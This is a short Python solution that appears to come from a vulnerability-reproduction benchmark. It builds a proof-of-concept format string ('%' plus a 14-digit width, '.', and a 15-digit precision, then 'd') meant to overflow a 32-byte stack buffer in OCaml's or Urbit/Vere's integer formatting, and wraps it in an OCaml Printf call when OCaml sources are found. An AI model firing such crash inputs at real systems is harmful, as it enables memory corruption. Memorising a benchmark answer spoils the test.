import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is a stack buffer overflow in the integer formatting logic
        (specifically in OCaml's runtime or similar C implementations like in Urbit/Vere).
        It occurs when reconstructing a format specifier into a fixed-size buffer (32 bytes).
        The reconstruction format is roughly "%<flags><width>.<precision><type>\0".
        To trigger it, we need the total length to exceed 32 bytes.
        This requires the sum of width digits and precision digits to be large enough.
        
        Required: 1 (%) + width_digits + 1 (.) + prec_digits + 1 (type) + 1 (null) > 32
        => width_digits + prec_digits > 28.
        
        We use width=14 and precision=15 (sum=29).
        """
        is_ocaml = False
        try:
            with tarfile.open(src_path, 'r') as tar:
                for member in tar.getmembers():
                    if member.name.endswith('.ml') or member.name.endswith('.mli'):
                        is_ocaml = True
                        break
        except Exception:
            pass

        # Construct payload: %11111111111111.111111111111111d
        width = b"1" * 14
        prec = b"1" * 15
        payload = b"%" + width + b"." + prec + b"d"
        
        if is_ocaml:
            # If OCaml source is detected, generate a minimal OCaml script
            return b'Printf.printf"' + payload + b'"0'
        else:
            # Otherwise assume a C binary harness that accepts the format string as input
            return payload